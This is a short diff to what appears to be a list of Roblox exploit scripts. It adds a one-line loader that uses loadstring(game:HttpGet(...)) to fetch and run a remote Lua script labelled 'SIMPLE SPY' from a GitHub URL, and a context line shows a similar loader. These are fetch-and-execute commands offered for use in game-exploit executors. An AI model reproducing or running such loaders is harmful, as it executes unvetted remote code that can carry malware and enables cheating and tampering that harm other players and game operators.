@@ -11,3 +11,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/crownytrex/xVantyxCoi
 ```
 
 
+```
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkNetworks/Infinite-Yield/main/SimpleSpyV3/main.lua"))() SIMPLE SPY
+```
